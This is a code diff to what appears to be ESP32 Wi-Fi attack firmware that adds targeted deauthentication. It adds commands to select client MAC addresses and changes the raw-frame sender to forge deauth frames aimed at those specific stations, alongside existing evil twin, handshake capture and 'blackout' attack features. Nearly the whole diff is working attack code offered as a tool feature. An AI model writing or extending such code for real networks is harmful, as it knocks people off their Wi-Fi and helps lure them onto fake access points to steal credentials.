@@ -154,6 +154,12 @@ typedef struct {
     bool active;
 } target_bssid_t;
 
+// Selected stations (clients) for targeted deauth
+typedef struct {
+    uint8_t mac[6];
+    bool active;
+} selected_station_t;
+
 // Sniffer data structures
 typedef struct {
     uint8_t mac[6];
@@ -247,6 +253,11 @@ static volatile bool blackout_attack_active = false;
 #define MAX_TARGET_BSSIDS 50
 static target_bssid_t *target_bssids = NULL;                // ~2.3 KB in PSRAM
 static int target_bssid_count = 0;
+
+// Selected stations for targeted deauth (allocated in PSRAM)
+#define MAX_SELECTED_STATIONS 32
+static selected_station_t *selected_stations = NULL;
+static int selected_stations_count = 0;
 static uint32_t last_channel_check_time = 0;
 static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
 static volatile bool periodic_rescan_in_progress = false; // Flag to suppress logs during periodic re-scans
@@ -736,9 +747,10 @@ static bool init_psram_buffers(void)
     sd_html_files = heap_caps_calloc(MAX_HTML_FILES, MAX_HTML_FILENAME, MALLOC_CAP_SPIRAM);
     target_bssids = heap_caps_calloc(MAX_TARGET_BSSIDS, sizeof(target_bssid_t), MALLOC_CAP_SPIRAM);
     whiteListedBssids = heap_caps_calloc(MAX_WHITELISTED_BSSIDS, sizeof(whitelisted_bssid_t), MALLOC_CAP_SPIRAM);
+    selected_stations = heap_caps_calloc(MAX_SELECTED_STATIONS, sizeof(selected_station_t), MALLOC_CAP_SPIRAM);
     
     if (!sniffer_aps || !probe_requests || !bt_devices || !wardrive_scan_results ||
-        !handshake_targets || !sd_html_files || !target_bssids || !whiteListedBssids) {
+        !handshake_targets || !sd_html_files || !target_bssids || !whiteListedBssids || !selected_stations) {
         MY_LOG_INFO(TAG, "PSRAM allocation failed!");
         return false;
     }
@@ -806,6 +818,8 @@ static int cmd_scan_networks(int argc, char **argv);
 static int cmd_show_scan_results(int argc, char **argv);
 static int cmd_select_networks(int argc, char **argv);
 static int cmd_unselect_networks(int argc, char **argv);
+static int cmd_select_stations(int argc, char **argv);
+static int cmd_unselect_stations(int argc, char **argv);
 static int cmd_start_evil_twin(int argc, char **argv);
 static int cmd_start_handshake(int argc, char **argv);
 static int cmd_save_handshake(int argc, char **argv);
@@ -2344,6 +2358,51 @@ static int cmd_unselect_networks(int argc, char **argv) {
     memset(g_selected_indices, 0, sizeof(g_selected_indices));
     
     MY_LOG_INFO(TAG, "Network selection cleared. Scan results preserved.");
+    return 0;
+}
+
+static int cmd_select_stations(int argc, char **argv) {
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: select_stations <MAC1> [MAC2] ...");
+        MY_LOG_INFO(TAG, "Example: select_stations AA:BB:CC:DD:EE:FF 11:22:33:44:55:66");
+        return 1;
+    }
+    
+    if (selected_stations == NULL) {
+        MY_LOG_INFO(TAG, "PSRAM not initialized for stations");
+        return 1;
+    }
+    
+    // Clear previous selection
+    selected_stations_count = 0;
+    memset(selected_stations, 0, MAX_SELECTED_STATIONS * sizeof(selected_station_t));
+    
+    // Parse MAC addresses
+    for (int i = 1; i < argc && selected_stations_count < MAX_SELECTED_STATIONS; i++) {
+        uint8_t mac[6];
+        if (sscanf(argv[i], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
+            memcpy(selected_stations[selected_stations_count].mac, mac, 6);
+            selected_stations[selected_stations_count].active = true;
+            selected_stations_count++;
+            MY_LOG_INFO(TAG, "Added station: %02X:%02X:%02X:%02X:%02X:%02X",
+                       mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+        } else {
+            MY_LOG_INFO(TAG, "Invalid MAC format: %s (use AA:BB:CC:DD:EE:FF)", argv[i]);
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Selected %d station(s) for targeted deauth", selected_stations_count);
+    return 0;
+}
+
+static int cmd_unselect_stations(int argc, char **argv) {
+    (void)argc; (void)argv;
+    selected_stations_count = 0;
+    if (selected_stations != NULL) {
+        memset(selected_stations, 0, MAX_SELECTED_STATIONS * sizeof(selected_station_t));
+    }
+    MY_LOG_INFO(TAG, "Station selection cleared. Deauth will use broadcast.");
     return 0;
 }
 
@@ -7644,6 +7703,24 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&unselect_cmd));
 
+    const esp_console_cmd_t select_stations_cmd = {
+        .command = "select_stations",
+        .help = "Select client MAC addresses for targeted deauth: select_stations <MAC1> [MAC2] ...",
+        .hint = NULL,
+        .func = &cmd_select_stations,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&select_stations_cmd));
+
+    const esp_console_cmd_t unselect_stations_cmd = {
+        .command = "unselect_stations",
+        .help = "Clear station selection (revert to broadcast deauth)",
+        .hint = NULL,
+        .func = &cmd_unselect_stations,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&unselect_stations_cmd));
+
     const esp_console_cmd_t start_cmd = {
         .command = "start_evil_twin",
         .help = "Starts Evil Twin attack.",
@@ -8036,6 +8113,8 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  select_html <index>");
       MY_LOG_INFO(TAG,"  select_networks <index1> [index2] ...");
       MY_LOG_INFO(TAG,"  unselect_networks");
+      MY_LOG_INFO(TAG,"  select_stations <MAC1> [MAC2] ...");
+      MY_LOG_INFO(TAG,"  unselect_stations");
       MY_LOG_INFO(TAG,"  show_probes");
       MY_LOG_INFO(TAG,"  show_scan_results");
       MY_LOG_INFO(TAG,"  show_sniffer_results");
@@ -8164,11 +8243,27 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
         }
 
-        uint8_t deauth_frame[sizeof(deauth_frame_default)];
-        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-        memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
-        memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
-        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        // If stations are selected, send targeted deauth to each station
+        if (selected_stations_count > 0) {
+            for (int s = 0; s < selected_stations_count; s++) {
+                if (!selected_stations[s].active) continue;
+                
+                uint8_t deauth_frame[sizeof(deauth_frame_default)];
+                memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+                // Set destination to specific station (not broadcast!)
+                memcpy(&deauth_frame[4], selected_stations[s].mac, 6);
+                memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
+                memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
+                wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+            }
+        } else {
+            // Broadcast deauth (original behavior)
+            uint8_t deauth_frame[sizeof(deauth_frame_default)];
+            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+            memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
+            memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
+            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        }
         
         // If clients are connected during evil twin, immediately return to first network's channel
         // This ensures we're on the correct channel when clients try to connect to the portal
